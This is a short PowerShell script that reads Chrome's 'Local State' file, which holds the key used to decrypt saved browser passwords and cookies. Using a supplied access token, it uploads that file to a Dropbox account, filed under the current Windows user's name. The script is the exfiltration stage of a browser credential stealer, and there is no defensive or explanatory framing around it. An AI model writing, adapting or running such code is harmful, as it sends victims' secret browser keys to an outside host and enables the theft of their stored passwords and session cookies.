
param(
    [Parameter(Mandatory = $true)]
    [string]$AccessToken
)

# Specify the path to the Local State file
$paths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
)
function Get-CurrentUser {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    return $currentUser.Name
}

$currentUser = Get-CurrentUser
$currentUser = $currentUser -replace "\\", "-"


function Upload-ToDropbox {
    Param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,
        [Parameter(Mandatory = $true)]
        [string]$DestinationPath
    )

    $dropboxApiArg = @{
        "autorename" = $true
        "mode" = "add"
        "mute" = $false
        "path" = "/$(${DestinationPath} -replace "\\", "/")"
        "strict_conflict" = $false
    }


    $dropboxApiArgJson = $dropboxApiArg | ConvertTo-Json -Compress
    $dropboxApiArgJson = $dropboxApiArgJson -replace "`r`n", ""
    $FilePath = $FilePath -replace "\\", "/"
    # Send the file content over HTTPS
    Write-Output "AccessToken: $AccessToken"

    $headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Dropbox-API-Arg" = $dropboxApiArgJson
    }

    Invoke-WebRequest -Uri "https://content.dropboxapi.com/2/files/upload" `
        -Method Post `
        -Headers $headers `
        -ContentType "application/octet-stream" `
        -InFile $FilePath
}

foreach ($path in $paths) {
    # Get the file name
    try {

        $parentDirectory = Split-Path -Path $path -Parent
        $grandParentDirectory = Split-Path -Path $parentDirectory -Parent
        $greatGrandParentDirectory = Split-Path -Path $grandParentDirectory -Parent
        $relativePath = $path.Replace($greatGrandParentDirectory + "\", "")
        $OutPath = Join-Path -Path $currentUser -ChildPath $RelativePath
        Upload-ToDropbox -FilePath $path -DestinationPath $OutPath
        Write-Output "1"

    } catch {
        Write-Output "Failed to upload $path"
        Write-Output $_.Exception.Message
    }
    

}

